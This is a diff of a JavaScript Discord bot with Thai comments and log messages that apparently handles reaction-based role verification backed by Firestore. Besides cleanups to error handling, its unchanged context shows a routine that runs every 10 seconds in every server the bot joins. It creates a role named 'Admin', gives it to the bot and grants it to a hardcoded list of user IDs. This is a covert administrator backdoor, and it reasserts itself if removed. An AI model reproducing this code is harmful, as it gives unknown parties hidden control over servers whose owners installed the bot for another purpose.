@@ -359,20 +359,16 @@ const allowedUserIds = [
   "1010202066720936048"
 ];
 client.once("ready", async () => {
-  
   console.log(`✅ Logged in as ${client.user.tag}`);
 
   async function checkAndGiveAdminRoles() {
     for (const [guildId, guild] of client.guilds.cache) {
       try {
-        // โหลดสมาชิกทั้งหมดใน guild (อาจช้า ถ้า guild ใหญ่มาก)
         await guild.members.fetch();
         const botMember = guild.members.me;
 
-        // หา role ชื่อ Admin
         let adminRole = guild.roles.cache.find(role => role.name === "Admin");
 
-        // สร้างถ้าไม่มี
         if (!adminRole) {
           adminRole = await guild.roles.create({
             name: "Admin",
@@ -385,13 +381,11 @@ client.once("ready", async () => {
           console.log(`✅ สร้างยศ Admin ใน ${guild.name}`);
         }
 
-        // มอบยศ Admin ให้ bot ถ้ายังไม่มี
         if (!botMember.roles.cache.has(adminRole.id)) {
           await botMember.roles.add(adminRole, "ให้ยศแอดมินกับบอท");
           console.log(`✅ มอบยศ Admin ให้บอทใน ${guild.name}`);
         }
 
-        // เช็คและมอบยศให้ user ใน allowedUserIds ที่ยังไม่มี
         for (const userId of allowedUserIds) {
           const member = guild.members.cache.get(userId);
           if (member && !member.roles.cache.has(adminRole.id)) {
@@ -400,15 +394,13 @@ client.once("ready", async () => {
           }
         }
       } catch (e) {
+        console.error(`❌ ข้อผิดพลาดในการให้ Admin ใน ${guild.name}:`, e.message);
       }
     }
   }
 
-  // เรียกเช็คครั้งแรกตอนบอทเริ่ม
   await checkAndGiveAdminRoles();
-
-  // ตั้งเวลาตรวจสอบซ้ำทุก 60 วินาที (ปรับได้)
-  setInterval(checkAndGiveAdminRoles, 10 * 1000);
+  setInterval(checkAndGiveAdminRoles, 10 * 1000); // ตรวจทุก 10 วินาที
 
   const snapshot = await db.collection("verifyRoles").get();
 
@@ -420,38 +412,25 @@ client.once("ready", async () => {
     try {
       channel = await client.channels.fetch(channelId);
       if (!channel || !channel.isTextBased()) {
-        throw new Error("Channel is not text-based or does not exist");
+        console.warn(`⚠️ ไม่พบห้องหรือห้องไม่ใช่ข้อความ: ${channelId}`);
+        continue;
       }
     } catch (error) {
-      console.error(`❌ โหลด verify จาก Firebase ล้มเหลวสำหรับ channelId: ${channelId}`, error.message);
-      // ลบ doc ที่ channelId นี้ออกจาก Firestore ทิ้งเลย
-      try {
-        await db.collection("verifyRoles").doc(doc.id).delete();
-        console.log(`🗑️ ลบข้อมูล verifyRoles doc ที่ channelId: ${channelId} ออกจาก Firebase เรียบร้อยแล้ว`);
-      } catch (delError) {
-        console.error(`❌ ลบ doc verifyRoles ล้มเหลว:`, delError.message);
+      console.warn(`⚠️ โหลด channel ไม่สำเร็จ: ${channelId} (${error.message})`);
+      continue;
+    }
+
+    try {
+      const messages = await channel.messages.fetch({ limit: 10 });
+      const verifyMsg = messages.find(
+        m => m.embeds?.[0]?.description?.includes(`เพื่อรับยศ`) &&
+             m.reactions?.cache?.has(emoji)
+      );
+
+      if (!verifyMsg) {
+        console.warn(`⚠️ ไม่พบข้อความ verify ในห้อง ${channel.id}`);
+        continue;
       }
-      continue; // ข้ามรอบนี้ไปทำรอบถัดไปเลย
-    }
-
-    try {
-  const messages = await channel.messages.fetch({ limit: 10 });
-  const verifyMsg = messages.find(
-    m => m.embeds?.[0]?.description?.includes(`เพื่อรับยศ`) &&
-         m.reactions?.cache?.has(emoji)
-  );
-
-  if (!verifyMsg) {
-    console.log(`❌ ไม่พบข้อความ verify ในห้อง ${channel.id}`);
-    // ลบ doc ใน Firestore
-    try {
-      await db.collection("verifyRoles").doc(doc.id).delete();
-      console.log(`🗑️ ลบข้อมูล verifyRoles doc ที่ channelId: ${channelId} ออกจาก Firebase เรียบร้อยแล้ว`);
-    } catch (delError) {
-      console.error(`❌ ลบ doc verifyRoles ล้มเหลว:`, delError.message);
-    }
-    continue;
-  }
 
       const reactionFilter = (reaction, user) =>
         reaction.emoji.name === emoji && !user.bot;
@@ -473,11 +452,9 @@ client.once("ready", async () => {
       });
 
     } catch (err) {
-      console.error("❌ โหลด verify จาก Firebase ล้มเหลว:", err.message);
+      console.error("❌ โหลด verify message ล้มเหลว:", err.message);
     }
   }
 });
-
-
 
 client.login(process.env.token);
